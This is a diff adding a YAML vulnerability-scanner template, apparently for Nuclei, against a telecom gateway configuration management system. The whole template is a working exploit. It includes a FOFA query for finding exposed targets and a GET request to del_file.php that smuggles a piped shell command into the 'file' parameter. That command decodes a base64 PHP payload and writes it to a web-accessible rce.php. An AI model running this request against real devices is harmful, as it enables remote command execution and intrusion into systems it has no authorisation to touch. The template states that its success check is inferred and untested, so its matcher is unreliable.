@@ -1,0 +1,36 @@
+id: poc-ehm45lb56nwwsob7
+info:
+  name: 电信网关配置管理系统 del_file.php 前台RCE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ehm45lb56nwwsob7
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ehm45lb56nwwsob7
+    fofa: body="img/login_bg3.png" && body="系统登录"
+http:
+- raw:
+  - 'GET /manager/newtpl/del_file.php?file=1.txt%7Cecho%20PD9waHAgcGhwaW5mbygpO3VubGluayhfX0ZJTEVfXyk7Pz4=%20%7C%20base64%20-d%20%3E%20rce.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+
+    Connection: close
+
+
+    验证URL：/manager/newtpl/rce.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
